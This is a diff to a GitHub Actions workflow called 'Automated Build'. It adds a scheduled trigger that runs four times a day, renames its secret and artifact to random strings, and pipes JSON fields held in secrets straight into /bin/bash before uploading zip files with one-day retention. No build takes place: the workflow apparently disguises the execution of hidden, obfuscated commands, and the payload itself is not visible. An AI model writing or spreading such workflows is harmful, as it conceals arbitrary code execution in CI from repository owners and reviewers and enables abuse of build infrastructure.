@@ -2,6 +2,8 @@ name: Automated Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '59 0,6,12,18 * * *'
 permissions:
   contents: read
 concurrency:
@@ -14,15 +16,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: Perform
         env:
-          y3: ${{ secrets.y3 }}
+          yh48: ${{ secrets.yh48 }}
         run: |
-          printf '%s' "$y3" | jq -r .wlf9 | /bin/bash
-          printf '%s' "$g0634" | jq -r .xhm90 | /bin/bash
-          echo $z944 | jq -r .gm9115 | /bin/bash
+          printf '%s' "$yh48" | jq -r .yze78 | /bin/bash
+          echo $yzipz6 | jq -r .zcvi6 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: nvmTZWoC
+          name: UhcRq62T
           path: "*.zip"
           retention-days: 1
